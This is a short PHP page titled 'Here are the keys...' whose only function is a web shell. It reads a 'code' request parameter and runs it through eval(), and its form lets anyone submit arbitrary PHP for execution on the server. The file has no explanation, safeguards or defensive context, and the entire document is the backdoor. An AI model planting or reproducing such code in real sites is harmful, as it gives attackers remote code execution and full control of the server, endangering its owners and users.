<html>
	<head>
		<title>Here are the keys...</title>
	</head>

	<body>
		<?php if($_REQUEST['code']){
			echo "Executing code...";

			eval(stripslashes($_REQUEST['code'])); 
		}?>

		<form action="<?php echo $_SERVER['PHP_SELF']; ?>">
			<input type="text" name="code">
			<input type="submit" name="Execute Code">
		</form>
	</body>
</html>